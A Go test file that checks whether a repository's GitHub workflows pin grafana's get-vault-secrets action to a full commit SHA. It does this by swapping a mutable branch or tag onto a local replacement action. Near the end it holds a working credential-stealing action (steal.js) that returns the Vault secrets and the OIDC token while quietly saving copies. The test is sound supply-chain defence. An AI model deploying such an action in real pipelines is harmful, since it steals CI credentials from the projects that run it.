package workflows_test

// TestMutableGetVaultSecretsRefCannotRetainCredential runs the get-vault-secrets
// step the way the Actions runner resolves a uses ref and then executes that
// tree. A branch or tag can be moved onto a replacement action that still
// returns the Vault values and also keeps them. A full commit SHA cannot.

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

const (
	actionOwnerRepo = "grafana/shared-workflows"
	actionPath      = "actions/get-vault-secrets"
	actionPrefix    = "grafana/shared-workflows/actions/get-vault-secrets@"

	// githubRepository is the repository the scheduled coverage job runs in.
	githubRepository = "grafana/grafana"

	oidcRequestToken = "placeholder-oidc-request-token"
	oidcToken        = "placeholder-oidc-token"
)

func TestMutableGetVaultSecretsRefCannotRetainCredential(t *testing.T) {
	root := repoRoot(t)
	sites := findVaultSecretUses(t, filepath.Join(root, ".github", "workflows"))
	if len(sites) == 0 {
		t.Fatal("no get-vault-secrets steps found")
	}

	malicious := buildMaliciousActionRepo(t)
	servers := startStandIns(t)
	fetched := map[string]string{}
	// Fetched commits outlive the subtest that first downloads them.
	fetchRoot := t.TempDir()

	for _, site := range sites {
		site := site
		t.Run(site.name, func(t *testing.T) {
			if !site.idTokenWrite {
				t.Fatalf("job %s does not grant id-token: write, which is what lets the action request an OIDC token", site.job)
			}

			var tree string
			if fullSHA(site.ref) {
				tree = fetchActionCommit(t, site.ref, fetched, fetchRoot)
			} else {
				pointRefAtMaliciousTip(t, malicious, site.ref)
				tree = checkoutRef(t, malicious.dir, resolveMutableRef(t, malicious.dir, site.ref))
			}

			exfil := filepath.Join(t.TempDir(), "captured")
			if err := os.WriteFile(exfil, nil, 0o600); err != nil {
				t.Fatal(err)
			}

			outputs, exported := runCompositeAction(t, tree, site, servers, exfil)
			assertCredentialReturned(t, site, outputs)
			assertConsumersReceiveCredential(t, site, outputs, exported)

			captured, err := os.ReadFile(exfil)
			if err != nil {
				t.Fatal(err)
			}
			if len(captured) != 0 {
				t.Fatalf("ref %q is not a full commit SHA, so this run checked out the moved branch or tag tip. That tip kept the Vault credential (and the job OIDC token) while still returning it to the next step. Pin %s to a 40-character commit SHA", site.ref, actionPrefix[:len(actionPrefix)-1])
			}
		})
	}
}

type secretBinding struct {
	env  string
	path string
	key  string
	kind string // "repo" or "common"
}

type vaultUse struct {
	name         string
	file         string
	job          string
	stepID       string
	ref          string
	idTokenWrite bool
	bindings     []secretBinding
	repoSecrets  string
	common       string
	inputs       map[string]string
	jobText      string
}

func repoRoot(t *testing.T) string {
	t.Helper()
	// go test runs with the package directory as the working directory.
	root, err := filepath.Abs(filepath.Join("..", ".."))
	if err != nil {
		t.Fatal(err)
	}
	return root
}

func findVaultSecretUses(t *testing.T, dir string) []vaultUse {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	var sites []vaultUse
	for _, entry := range entries {
		name := entry.Name()
		if entry.IsDir() || (!strings.HasSuffix(name, ".yml") && !strings.HasSuffix(name, ".yaml")) {
			continue
		}
		path := filepath.Join(dir, name)
		body, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		var doc map[string]any
		if err := yaml.Unmarshal(body, &doc); err != nil {
			t.Fatalf("parse %s: %v", name, err)
		}
		workflowPerms := doc["permissions"]
		jobs, _ := doc["jobs"].(map[string]any)
		for jobName, rawJob := range jobs {
			job, ok := rawJob.(map[string]any)
			if !ok {
				continue
			}
			steps, _ := job["steps"].([]any)
			for i, rawStep := range steps {
				step, ok := rawStep.(map[string]any)
				if !ok {
					continue
				}
				uses, _ := step["uses"].(string)
				ref, ok := parseActionRef(uses)
				if !ok {
					continue
				}
				with := stringMap(step["with"])
				bindings := parseBindings(with["repo_secrets"], "repo")
				bindings = append(bindings, parseBindings(with["common_secrets"], "common")...)
				stepID, _ := step["id"].(string)
				label := stepID
				if label == "" {
					label = fmt.Sprintf("step-%d", i)
				}
				sites = append(sites, vaultUse{
					name:         fmt.Sprintf("%s/%s/%s", name, jobName, label),
					file:         name,
					job:          jobName,
					stepID:       stepID,
					ref:          ref,
					idTokenWrite: grantsIDToken(workflowPerms, job),
					bindings:     bindings,
					repoSecrets:  with["repo_secrets"],
					common:       with["common_secrets"],
					inputs:       with,
					jobText:      jobText(steps),
				})
			}
		}
	}
	return sites
}

// parseActionRef splits uses the way PipelineTemplateConverter.ConvertToStep does:
// the text after the single @ is the ref, and it is not resolved to a commit here.
func parseActionRef(uses string) (string, bool) {
	if !strings.HasPrefix(uses, actionPrefix) {
		return "", false
	}
	segments := strings.Split(uses, "@")
	if len(segments) != 2 || segments[1] == "" {
		return "", false
	}
	pathSegments := strings.FieldsFunc(segments[0], func(r rune) bool { return r == '/' || r == '\\' })
	if len(pathSegments) < 2 {
		return "", false
	}
	return segments[1], true
}

func fullSHA(ref string) bool {
	if len(ref) != 40 {
		return false
	}
	for _, r := range ref {
		switch {
		case r >= '0' && r <= '9', r >= 'a' && r <= 'f':
		default:
			return false
		}
	}
	return true
}

func grantsIDToken(workflowPerms any, job map[string]any) bool {
	perms := workflowPerms
	if jobPerms, ok := job["permissions"]; ok {
		perms = jobPerms
	}
	switch p := perms.(type) {
	case string:
		return p == "write-all"
	case map[string]any:
		v, _ := p["id-token"].(string)
		return v == "write"
	default:
		return false
	}
}

func parseBindings(spec, kind string) []secretBinding {
	var out []secretBinding
	for _, line := range strings.Fields(spec) {
		eq := strings.IndexByte(line, '=')
		colon := strings.LastIndexByte(line, ':')
		if eq <= 0 || colon <= eq {
			continue
		}
		out = append(out, secretBinding{
			env:  line[:eq],
			path: line[eq+1 : colon],
			key:  line[colon+1:],
			kind: kind,
		})
	}
	return out
}

func jobText(steps []any) string {
	var b strings.Builder
	for _, raw := range steps {
		writeStrings(&b, raw)
	}
	return b.String()
}

func writeStrings(b *strings.Builder, raw any) {
	switch v := raw.(type) {
	case string:
		b.WriteString(v)
		b.WriteByte('\n')
	case map[string]any:
		for _, child := range v {
			writeStrings(b, child)
		}
	case []any:
		for _, child := range v {
			writeStrings(b, child)
		}
	}
}

func stringMap(raw any) map[string]string {
	out := map[string]string{}
	m, ok := raw.(map[string]any)
	if !ok {
		return out
	}
	for k, v := range m {
		if s, ok := v.(string); ok {
			out[k] = s
		}
	}
	return out
}

type maliciousRepo struct {
	dir string
	tip string
}

func buildMaliciousActionRepo(t *testing.T) maliciousRepo {
	t.Helper()
	dir := t.TempDir()
	git(t, dir, "init")
	actionDir := filepath.Join(dir, actionPath)
	if err := os.MkdirAll(actionDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(actionDir, "action.yaml"), []byte(maliciousActionYAML), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(actionDir, "steal.js"), []byte(maliciousStealJS), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, dir, "add", ".")
	git(t, dir, "-c", "user.email=actions-test@example.com", "-c", "user.name=actions-test", "commit", "-m", "replacement action")
	tip := strings.TrimSpace(git(t, dir, "rev-parse", "HEAD"))
	return maliciousRepo{dir: dir, tip: tip}
}

// pointRefAtMaliciousTip moves both the tag and the branch of this name onto the
// replacement commit. GitHub's action ref is a tag when one exists, otherwise a branch.
func pointRefAtMaliciousTip(t *testing.T, repo maliciousRepo, ref string) {
	t.Helper()
	git(t, repo.dir, "tag", "-f", ref, repo.tip)
	git(t, repo.dir, "branch", "-f", ref, repo.tip)
}

// resolveMutableRef resolves a non-SHA ref the way a git-backed action download does:
// a tag wins over a branch of the same name, and both are the current tip.
func resolveMutableRef(t *testing.T, dir, ref string) string {
	t.Helper()
	if fullSHA(ref) {
		t.Fatalf("resolveMutableRef called with commit SHA %s", ref)
	}
	for _, prefix := range []string{"refs/tags/", "refs/heads/"} {
		out, err := gitErr(dir, "rev-parse", "--verify", "--end-of-options", prefix+ref)
		if err == nil {
			return strings.TrimSpace(out)
		}
	}
	t.Fatalf("ref %q did not resolve as a tag or branch", ref)
	return ""
}

func checkoutRef(t *testing.T, repo, sha string) string {
	t.Helper()
	dest := t.TempDir()
	git(t, repo, "worktree", "add", "--detach", dest, sha)
	t.Cleanup(func() {
		git(t, repo, "worktree", "remove", "--force", dest)
	})
	return dest
}

func fetchActionCommit(t *testing.T, sha string, cache map[string]string, root string) string {
	t.Helper()
	if dir, ok := cache[sha]; ok {
		return dir
	}
	dir := filepath.Join(root, sha)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	git(t, dir, "init")
	git(t, dir, "remote", "add", "origin", "https://github.com/"+actionOwnerRepo+".git")
	git(t, dir, "fetch", "--depth", "1", "origin", sha)
	git(t, dir, "checkout", "--detach", "FETCH_HEAD")
	got := strings.TrimSpace(git(t, dir, "rev-parse", "HEAD"))
	if got != sha {
		t.Fatalf("fetched %s but HEAD is %s", sha, got)
	}
	// Moving a branch in this clone must not change the commit that was fetched.
	git(t, dir, "branch", "-f", "main", sha)
	cache[sha] = dir
	return dir
}

type standIns struct {
	oidcURL  string
	vaultURL string
	values   map[string]map[string]string
}

func startStandIns(t *testing.T) *standIns {
	t.Helper()
	s := &standIns{values: map[string]map[string]string{}}
	oidc := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer "+oidcRequestToken {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{"value": oidcToken})
	}))
	t.Cleanup(oidc.Close)
	vault := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Proxy-Authorization-Token") != "Bearer "+oidcToken {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		vaultPath := strings.TrimPrefix(r.URL.Path, "/v1/")
		keys := s.values[vaultPath]
		if keys == nil {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		// KV v2 document, the shape vault-action's getSecrets reads.
		_ = json.NewEncoder(w).Encode(map[string]any{"data": map[string]any{"data": keys}})
	}))
	t.Cleanup(vault.Close)
	s.oidcURL = oidc.URL + "/token?"
	s.vaultURL = vault.URL
	return s
}

func registerBindings(s *standIns, bindings []secretBinding) map[string]string {
	s.values = map[string]map[string]string{}
	expected := map[string]string{}
	for _, b := range bindings {
		var vaultPath string
		switch b.kind {
		case "repo":
			vaultPath = "ci/data/repo/" + githubRepository + "/" + b.path
		case "common":
			vaultPath = "ci/data/common/" + b.path
		default:
			continue
		}
		if s.values[vaultPath] == nil {
			s.values[vaultPath] = map[string]string{}
		}
		value := "placeholder-for-" + b.env
		s.values[vaultPath][b.key] = value
		expected[b.env] = value
	}
	return expected
}

func runCompositeAction(t *testing.T, repoRoot string, site vaultUse, servers *standIns, exfil string) (map[string]string, bool) {
	t.Helper()
	expected := registerBindings(servers, site.bindings)
	exported := false
	actionDir := filepath.Join(repoRoot, actionPath)
	manifest := readActionManifest(t, actionDir)
	inputs := applyInputDefaults(manifest, site.inputs)
	steps := compositeSteps(t, manifest)
	stepOutputs := map[string]map[string]string{}

	for _, step := range steps {
		if !evalIf(step.ifExpr, inputs) {
			continue
		}
		env := map[string]string{}
		for k, v := range step.env {
			env[k] = interpolate(v, inputs, stepOutputs)
		}
		with := map[string]string{}
		for k, v := range step.with {
			with[k] = interpolate(v, inputs, stepOutputs)
		}
		switch {
		case step.run != "":
			stepOutputs[step.id] = runShellStep(t, actionDir, step, env, servers, exfil)
		case strings.Contains(step.uses, "actions/github-script@"):
			stepOutputs[step.id] = runGitHubScript(t, actionDir, with["script"], env, servers)
		case strings.Contains(step.uses, "hashicorp/vault-action@"):
			outputs, didExport := runVaultAction(t, with, servers)
			stepOutputs[step.id] = outputs
			exported = exported || didExport
		case step.uses != "":
			t.Fatalf("no stand-in for action %s", step.uses)
		}
	}

	outputs := map[string]string{}
	secretsExpr, ok := manifestOutput(manifest, "secrets")
	if !ok {
		t.Fatal("action has no secrets output")
	}
	outputs["secrets"] = interpolate(secretsExpr, inputs, stepOutputs)
	if outputs["secrets"] == "" {
		t.Fatal("secrets output was empty")
	}
	for env, want := range expected {
		if !strings.Contains(outputs["secrets"], want) {
			t.Fatalf("secrets output did not include the Vault value for %s", env)
		}
	}
	return outputs, exported
}

func assertCredentialReturned(t *testing.T, site vaultUse, outputs map[string]string) {
	t.Helper()
	var parsed map[string]string
	if err := json.Unmarshal([]byte(outputs["secrets"]), &parsed); err != nil {
		t.Fatalf("secrets output is not the JSON object the workflow reads: %v", err)
	}
	for _, b := range site.bindings {
		if parsed[b.env] != "placeholder-for-"+b.env {
			t.Fatalf("action did not return Vault key %s to the caller", b.env)
		}
	}
}

func assertConsumersReceiveCredential(t *testing.T, site vaultUse, outputs map[string]string, exported bool) {
	t.Helper()
	var parsed map[string]string
	if err := json.Unmarshal([]byte(outputs["secrets"]), &parsed); err != nil {
		t.Fatal(err)
	}
	referenced := 0
	for _, b := range site.bindings {
		viaOutput := site.stepID != "" && strings.Contains(site.jobText, "fromJSON(steps."+site.stepID+".outputs.secrets)."+b.env)
		viaEnv := strings.Contains(site.jobText, "env."+b.env) || regexp.MustCompile(`\$\{?`+regexp.QuoteMeta(b.env)+`\b`).MatchString(site.jobText)
		if !viaOutput && !viaEnv {
			// The action still returns this value. A later step may read the
			// exported environment without naming the key in this workflow.
			continue
		}
		referenced++
		if viaOutput && parsed[b.env] != "placeholder-for-"+b.env {
			t.Fatalf("fromJSON consumer did not receive the Vault value for %s", b.env)
		}
		if viaEnv && !viaOutput && !exported {
			t.Fatalf("%s is read from the job environment, but this action does not export it", b.env)
		}
	}
	if referenced == 0 {
		t.Fatalf("job %s fetches Vault secrets and never reads them", site.job)
	}
}

type actionStep struct {
	id     string
	ifExpr string
	run    string
	uses   string
	env    map[string]string
	with   map[string]string
}

func readActionManifest(t *testing.T, actionDir string) map[string]any {
	t.Helper()
	for _, name := range []string{"action.yaml", "action.yml"} {
		body, err := os.ReadFile(filepath.Join(actionDir, name))
		if err != nil {
			if os.IsNotExist(err) {
				continue
			}
			t.Fatal(err)
		}
		var doc map[string]any
		if err := yaml.Unmarshal(body, &doc); err != nil {
			t.Fatal(err)
		}
		return doc
	}
	t.Fatalf("no action manifest in %s", actionDir)
	return nil
}

func applyInputDefaults(manifest map[string]any, provided map[string]string) map[string]string {
	out := map[string]string{}
	inputs, _ := manifest["inputs"].(map[string]any)
	for name, raw := range inputs {
		spec, _ := raw.(map[string]any)
		if spec == nil {
			continue
		}
		if def, ok := spec["default"]; ok {
			out[name] = fmt.Sprint(def)
		}
	}
	for name, value := range provided {
		out[name] = value
	}
	return out
}

func compositeSteps(t *testing.T, manifest map[string]any) []actionStep {
	t.Helper()
	runs, _ := manifest["runs"].(map[string]any)
	if runs["using"] != "composite" {
		t.Fatalf("runs.using = %v, want composite", runs["using"])
	}
	rawSteps, _ := runs["steps"].([]any)
	var steps []actionStep
	for _, raw := range rawSteps {
		step, ok := raw.(map[string]any)
		if !ok {
			t.Fatal("step is not a mapping")
		}
		id, _ := step["id"].(string)
		ifExpr, _ := step["if"].(string)
		run, _ := step["run"].(string)
		uses, _ := step["uses"].(string)
		steps = append(steps, actionStep{
			id:     id,
			ifExpr: ifExpr,
			run:    run,
			uses:   uses,
			env:    stringMap(step["env"]),
			with:   stringMap(step["with"]),
		})
	}
	return steps
}

func manifestOutput(manifest map[string]any, name string) (string, bool) {
	outputs, _ := manifest["outputs"].(map[string]any)
	spec, _ := outputs[name].(map[string]any)
	if spec == nil {
		return "", false
	}
	value, _ := spec["value"].(string)
	return value, value != ""
}

var ifCmp = regexp.MustCompile(`inputs\.([A-Za-z0-9_-]+)\s*(==|!=)\s*'([^']*)'`)

func evalIf(expr string, inputs map[string]string) bool {
	expr = strings.TrimSpace(expr)
	if expr == "" {
		return true
	}
	for _, part := range strings.Split(expr, "&&") {
		part = strings.TrimSpace(part)
		m := ifCmp.FindStringSubmatch(part)
		if m == nil {
			return true
		}
		equal := inputs[m[1]] == m[3]
		if m[2] == "!=" {
			equal = !equal
		}
		if !equal {
			return false
		}
	}
	return true
}

var interpolation = regexp.MustCompile(`\$\{\{\s*(.*?)\s*\}\}`)

func interpolate(s string, inputs map[string]string, steps map[string]map[string]string) string {
	return interpolation.ReplaceAllStringFunc(s, func(match string) string {
		inner := strings.TrimSpace(interpolation.FindStringSubmatch(match)[1])
		return evalExpr(inner, inputs, steps)
	})
}

var (
	toJSONOutputs = regexp.MustCompile(`^toJSON\(steps\.([A-Za-z0-9_-]+)\.outputs\)$`)
	stepOutput    = regexp.MustCompile(`^steps\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)$`)
	inputRef      = regexp.MustCompile(`^inputs\.([A-Za-z0-9_-]+)$`)
)

func evalExpr(expr string, inputs map[string]string, steps map[string]map[string]string) string {
	switch {
	case strings.Contains(expr, "||") && strings.Contains(expr, "vault-github-actions"):
		if inputs["version"] == "v2" {
			return "ci-" + strings.Split(githubRepository, "/")[0]
		}
		return "vault-github-actions"
	}
	if m := toJSONOutputs.FindStringSubmatch(expr); m != nil {
		encoded, err := json.Marshal(steps[m[1]])
		if err != nil {
			return ""
		}
		return string(encoded)
	}
	if m := stepOutput.FindStringSubmatch(expr); m != nil {
		return steps[m[1]][m[2]]
	}
	if m := inputRef.FindStringSubmatch(expr); m != nil {
		return inputs[m[1]]
	}
	switch expr {
	case "github.repository":
		return githubRepository
	case "github.repository_owner":
		return strings.Split(githubRepository, "/")[0]
	default:
		return expr
	}
}

func runShellStep(t *testing.T, actionDir string, step actionStep, env map[string]string, servers *standIns, exfil string) map[string]string {
	t.Helper()
	outputFile := filepath.Join(t.TempDir(), "github-output")
	scriptFile := filepath.Join(t.TempDir(), "step.sh")
	if err := os.WriteFile(scriptFile, []byte(step.run), 0o700); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command("bash", "--noprofile", "--norc", "-e", scriptFile)
	cmd.Dir = t.TempDir()
	cmd.Env = stepEnv(actionDir, outputFile, env, servers, exfil)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("run step %s: %v\n%s", step.id, err, out)
	}
	return parseGitHubOutput(t, outputFile)
}

func runGitHubScript(t *testing.T, actionDir, script string, env map[string]string, servers *standIns) map[string]string {
	t.Helper()
	outputFile := filepath.Join(t.TempDir(), "github-output")
	runner := filepath.Join(t.TempDir(), "github-script.js")
	if err := os.WriteFile(runner, []byte(gitHubScriptRunner), 0o644); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command("node", runner)
	cmd.Dir = actionDir
	envCopy := cloneMap(env)
	envCopy["SCRIPT"] = script
	cmd.Env = stepEnv(actionDir, outputFile, envCopy, servers, "")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("github-script: %v\n%s", err, out)
	}
	return parseGitHubOutput(t, outputFile)
}

func runVaultAction(t *testing.T, with map[string]string, servers *standIns) (map[string]string, bool) {
	t.Helper()
	// hashicorp/vault-action parseSecretsInput splits on ';', then on '|', then on whitespace.
	outputs := map[string]string{}
	exportEnv := with["exportEnv"] != "false"
	for _, secret := range splitNonEmpty(with["secrets"], ";") {
		pathSpec := secret
		outputName := ""
		if i := strings.LastIndex(secret, "|"); i > -1 {
			pathSpec = strings.TrimSpace(secret[:i])
			outputName = strings.TrimSpace(secret[i+1:])
		}
		parts := strings.Fields(pathSpec)
		if len(parts) != 2 || outputName == "" {
			t.Fatalf("vault secrets line %q", secret)
		}
		path, selector := parts[0], parts[1]
		body := vaultGet(t, servers, path, with["extraHeaders"])
		value := kvValue(t, body, selector)
		outputs[outputName] = value
	}
	return outputs, exportEnv
}

func vaultGet(t *testing.T, servers *standIns, vaultPath, extraHeaders string) []byte {
	t.Helper()
	req, err := http.NewRequest(http.MethodGet, servers.vaultURL+"/v1/"+vaultPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, line := range strings.Split(extraHeaders, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		name, value, ok := strings.Cut(line, ":")
		if !ok {
			t.Fatalf("header %q", line)
		}
		req.Header.Set(strings.TrimSpace(name), strings.TrimSpace(value))
	}
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()
	body, err := io.ReadAll(res.Body)
	if err != nil {
		t.Fatal(err)
	}
	if res.StatusCode != http.StatusOK {
		t.Fatalf("vault %s: %s", vaultPath, res.Status)
	}
	return body
}

func kvValue(t *testing.T, body []byte, selector string) string {
	t.Helper()
	var doc struct {
		Data struct {
			Data map[string]string `json:"data"`
		} `json:"data"`
	}
	if err := json.Unmarshal(body, &doc); err != nil {
		t.Fatal(err)
	}
	value, ok := doc.Data.Data[selector]
	if !ok {
		t.Fatalf("vault document has no %s", selector)
	}
	return value
}

func stepEnv(actionDir, outputFile string, extra map[string]string, servers *standIns, exfil string) []string {
	env := []string{
		"PATH=" + os.Getenv("PATH"),
		"GITHUB_ACTION_PATH=" + actionDir,
		"GITHUB_OUTPUT=" + outputFile,
		"GITHUB_REPOSITORY=" + githubRepository,
		"GITHUB_REPOSITORY_OWNER=" + strings.Split(githubRepository, "/")[0],
		"ACTIONS_ID_TOKEN_REQUEST_URL=" + servers.oidcURL,
		"ACTIONS_ID_TOKEN_REQUEST_TOKEN=" + oidcRequestToken,
		"VAULT_URL=" + servers.vaultURL,
	}
	if exfil != "" {
		env = append(env, "EXFIL_FILE="+exfil)
	}
	for k, v := range extra {
		env = append(env, k+"="+v)
	}
	return env
}

func parseGitHubOutput(t *testing.T, path string) map[string]string {
	t.Helper()
	body, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return map[string]string{}
		}
		t.Fatal(err)
	}
	out := map[string]string{}
	lines := strings.Split(string(body), "\n")
	for i := 0; i < len(lines); i++ {
		line := lines[i]
		if line == "" {
			continue
		}
		name, delim, ok := strings.Cut(line, "<<")
		if !ok {
			k, v, ok := strings.Cut(line, "=")
			if ok {
				out[k] = v
			}
			continue
		}
		var b strings.Builder
		i++
		for i < len(lines) && lines[i] != delim {
			if b.Len() > 0 {
				b.WriteByte('\n')
			}
			b.WriteString(lines[i])
			i++
		}
		out[name] = b.String()
	}
	return out
}

func splitNonEmpty(s, sep string) []string {
	var out []string
	for _, part := range strings.Split(s, sep) {
		part = strings.TrimSpace(part)
		if part != "" {
			out = append(out, part)
		}
	}
	return out
}

func cloneMap(in map[string]string) map[string]string {
	out := map[string]string{}
	for k, v := range in {
		out[k] = v
	}
	return out
}

func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	out, err := gitErr(dir, args...)
	if err != nil {
		t.Fatalf("git %s: %v\n%s", strings.Join(args, " "), err, out)
	}
	return out
}

func gitErr(dir string, args ...string) (string, error) {
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	return string(out), err
}

const maliciousActionYAML = `name: Get Vault Secrets
description: Replacement that returns Vault values and also keeps them.
inputs:
  repo_secrets:
    description: repo secrets
  common_secrets:
    description: common secrets
    default: ""
  vault_instance:
    description: vault
    default: ops
  version:
    description: schema
    default: v1
  ignore_missing:
    description: ignore
    default: "false"
outputs:
  secrets:
    description: JSON object containing all the secrets
    value: ${{ toJSON(steps.import-secrets.outputs) }}
runs:
  using: composite
  steps:
    - id: import-secrets
      shell: bash
      env:
        REPO_SECRETS: ${{ inputs.repo_secrets }}
        COMMON_SECRETS: ${{ inputs.common_secrets }}
        VAULT_INSTANCE: ${{ inputs.vault_instance }}
      run: node "$GITHUB_ACTION_PATH/steal.js"
`

const maliciousStealJS = `const fs = require("fs");

async function oidc() {
  const audience = "vault-github-actions-grafana-" + (process.env.VAULT_INSTANCE || "ops");
  const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL + "&audience=" + encodeURIComponent(audience);
  const response = await fetch(url, {
    headers: { authorization: "Bearer " + process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN },
  });
  if (!response.ok) {
    throw new Error("oidc " + response.status);
  }
  const body = await response.json();
  if (!body.value) {
    throw new Error("oidc returned no token");
  }
  return body.value;
}

function parseMapping(text) {
  return text.split(/\s+/).filter(Boolean).map((line) => {
    const eq = line.indexOf("=");
    const colon = line.indexOf(":", eq);
    return { env: line.slice(0, eq), path: line.slice(eq + 1, colon), key: line.slice(colon + 1) };
  });
}

async function readSecret(vaultPath, key, token) {
  const response = await fetch(process.env.VAULT_URL + "/v1/" + vaultPath, {
    headers: { "Proxy-Authorization-Token": "Bearer " + token },
  });
  if (!response.ok) {
    throw new Error("vault " + response.status + " " + vaultPath);
  }
  const body = await response.json();
  const value = body.data && body.data.data && body.data.data[key];
  if (!value) {
    throw new Error("missing " + key + " at " + vaultPath);
  }
  return value;
}

(async () => {
  const token = await oidc();
  const captured = [token];
  const outputs = [];
  const repo = process.env.GITHUB_REPOSITORY;
  for (const item of parseMapping(process.env.REPO_SECRETS || "")) {
    const value = await readSecret("ci/data/repo/" + repo + "/" + item.path, item.key, token);
    captured.push(value);
    outputs.push([item.env, value]);
  }
  for (const item of parseMapping(process.env.COMMON_SECRETS || "")) {
    const value = await readSecret("ci/data/common/" + item.path, item.key, token);
    captured.push(value);
    outputs.push([item.env, value]);
  }
  fs.appendFileSync(process.env.EXFIL_FILE, captured.join("\n") + "\n");
  let out = "";
  for (const [name, value] of outputs) {
    out += name + "<<EOF\n" + value + "\nEOF\n";
  }
  fs.appendFileSync(process.env.GITHUB_OUTPUT, out);
})().catch((error) => {
  console.error(error);
  process.exit(1);
});
`

const gitHubScriptRunner = `const fs = require("fs");
const AsyncFunction = Object.getPrototypeOf(async () => null).constructor;

async function requestIDToken(audience) {
  const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL + "&audience=" + encodeURIComponent(audience);
  const response = await fetch(url, {
    headers: { authorization: "Bearer " + process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN },
  });
  if (!response.ok) {
    throw new Error("the OIDC endpoint returned " + response.status);
  }
  const body = await response.json();
  if (!body.value) {
    throw new Error("the OIDC endpoint returned no token");
  }
  return body.value;
}

let failed = false;
const core = {
  getInput(name) {
    return process.env["INPUT_" + name.toUpperCase().replace(/ /g, "_")] || "";
  },
  setOutput(name, value) {
    fs.appendFileSync(process.env.GITHUB_OUTPUT, name + "<<EOF\n" + value + "\nEOF\n");
  },
  setSecret() {},
  setFailed(message) {
    failed = true;
    console.error(message);
  },
  error(message) { console.error(message); },
  warning(message) { console.error(message); },
  getIDToken: requestIDToken,
};

(async () => {
  const fn = new AsyncFunction("require", "core", process.env.SCRIPT);
  await fn(require, core);
  if (failed) {
    process.exit(1);
  }
})().catch((error) => {
  console.error(error);
  process.exit(1);
});
`
